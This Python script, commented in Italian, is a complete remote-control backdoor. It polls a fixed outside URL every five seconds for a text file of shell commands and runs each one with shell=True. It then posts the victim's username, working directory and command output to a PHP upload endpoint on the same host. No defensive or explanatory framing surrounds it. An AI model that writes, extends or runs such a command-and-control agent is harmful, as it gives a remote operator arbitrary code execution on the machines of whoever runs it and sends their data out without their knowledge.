import requests
import subprocess
import time
import os

def ottieni_info_utente():
    # Ottieni il nome utente corrente
    username = os.getlogin()

    # Ottieni la directory corrente
    posizione_attuale = os.getcwd()

    return username, posizione_attuale

def leggi_comandi_da_file(indirizzo_web):
    try:
        while True:
            # Scarica il contenuto del file TXT dal web
            risposta = requests.get(indirizzo_web)
            risposta.raise_for_status()

            # Leggi i comandi dal contenuto del file
            comandi = risposta.text.strip().split('\n')

            # Esegui i comandi uno per uno
            for comando in comandi:
                esegui_comando(comando)

            # Attendi 5 secondi prima di ripetere il ciclo
            time.sleep(5)

    except requests.exceptions.RequestException as e:
        print(f"Errore durante il download del file: {e}")
    except subprocess.CalledProcessError as e:
        print(f"Errore durante l'esecuzione del comando: {e}")
    except Exception as e:
        print(f"Errore sconosciuto: {e}")

def invia_testo_al_server(testo):
    url_php = "https://www.zyon.it/upload/uppa.php"  # Sostituisci con l'effettivo URL della tua pagina PHP

    dati = {'testo': testo}

    try:
        # Invia la richiesta POST al server PHP
        risposta = requests.post(url_php, data=dati)
        risposta.raise_for_status()

        print("Testo inviato con successo!")

    except requests.exceptions.RequestException as e:
        print(f"Errore durante l'invio del testo: {e}")

def esegui_comando(comando):
    try:
        #recupera user e directory
        user, posizione = ottieni_info_utente()
        # Esegui il comando tramite CLI
        risultato = subprocess.run(comando, shell=True, check=True, capture_output=True, text=True)
        invia_testo_al_server(user + " " + posizione + " " + risultato.stdout)

    except subprocess.CalledProcessError as e:
        print(f"Errore durante l'esecuzione del comando: {e}")

# Sostituisci con l'indirizzo web del tuo file TXT
indirizzo_web = "https://www.zyon.it/upload/command.txt"
leggi_comandi_da_file(indirizzo_web)
